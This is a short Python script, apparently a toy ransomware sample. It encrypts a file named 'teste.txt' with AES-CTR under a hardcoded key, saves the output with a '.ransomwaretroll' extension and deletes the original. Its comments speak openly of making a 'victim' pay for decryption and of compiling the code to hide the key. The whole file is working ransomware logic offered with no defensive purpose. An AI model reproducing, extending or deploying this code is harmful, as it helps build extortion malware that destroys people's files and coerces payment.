import os
import pyaes

file_name = 'teste.txt'
with open(file_name, 'rb') as f:
    file_data = f.read()

key = b"testeransomwares" ## keys should not be in the same file, consider compiling the python code to make it harder
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

with open(file_name + ".ransomwaretroll",'wb') as f:
    f.write(crypto_data)

## remove only after successful encryption, otherwise victim will not pay money to decrypt, duhh...
os.remove(file_name)
